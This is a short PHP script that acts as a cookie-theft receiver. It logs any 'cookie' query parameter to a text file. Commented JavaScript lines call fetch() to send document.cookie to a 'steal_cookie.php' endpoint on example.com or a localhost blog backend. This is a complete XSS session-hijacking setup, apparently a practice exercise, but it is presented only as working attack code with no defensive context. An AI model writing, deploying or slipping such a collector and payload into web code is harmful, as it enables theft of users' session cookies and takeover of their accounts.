<?PHP

if(isset($_GET["cookie"])){
    $cookie = $_GET['cookie'];

    $file = fopen('test.txt' , "a");
    fwrite($file, "Cookie: " . $cookie . "\n");
    fclose($file);

}
// fetch('https://example.com/steal_cookie.php?cookie=' + document.cookie);
// fetch('http://localhost/blogBackend/mycookies.php?cookie=' + document.cookie);
?>
